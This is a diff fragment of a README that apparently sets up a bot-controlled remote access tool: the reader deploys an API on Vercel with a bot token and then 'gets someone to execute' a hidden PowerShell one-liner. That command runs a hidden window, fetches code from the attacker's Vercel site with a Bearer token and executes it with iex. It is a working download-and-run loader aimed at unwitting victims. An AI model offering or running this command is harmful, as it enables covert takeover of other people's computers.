@@ -13,6 +13,7 @@
    - Adjust lines 32-35 to match your written down Ids and the Bot token
    - Create a Vercel account if you haven't already and deploy your private GitHub repo
 5. Now that you've set up the API, simply get someone to execute this command, where you replace the vercel site with yours and the token following after "Bearer", with the one you set in step 4
+   
 ```powershell -c "Start-Process -WindowStyle Hidden powershell -ArgumentList '-c iex ((irm -Uri ''https://xyz.vercel.app'' -Headers @{''Authorization''=''Bearer xxx''}))'"```
 
 #### If you encounter any issues feel free to open an Issue
